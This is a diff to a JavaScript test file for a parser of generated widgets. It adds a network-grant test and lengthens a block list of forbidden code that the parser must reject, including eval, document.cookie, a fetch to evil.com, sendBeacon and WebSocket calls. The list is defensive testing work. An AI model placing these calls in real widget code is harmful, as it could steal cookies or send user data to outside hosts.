@@ -18,8 +18,14 @@ test('strips markdown fences', () => {
   assert.ok(r.widget);
 });
 
+test('accepts the network grant', () => {
+  const w = JSON.parse(good); w.grants = ['inference', 'network'];
+  const r = parseGeneratedWidget(JSON.stringify(w));
+  assert.deepEqual(r.widget?.grants, ['inference', 'network']);
+});
+
 test('rejects eval / new Function / fetch / cookie access', () => {
-  for (const bad of ['eval("x")', 'new Function("x")', 'document.cookie', 'fetch("https://evil.com")', 'new XMLHttpRequest()']) {
+  for (const bad of ['eval("x")', 'new Function("x")', 'document.cookie', 'fetch("https://evil.com")', 'fetch("/api/x")', 'new XMLHttpRequest()', 'navigator.sendBeacon("/x")', 'new WebSocket("wss://x")']) {
     const w = JSON.parse(good); w.code = `const x = document.createElement("div"); ${bad}; document.body.appendChild(x);`;
     const r = parseGeneratedWidget(JSON.stringify(w));
     assert.ok(!r.widget, `should reject: ${bad}`);
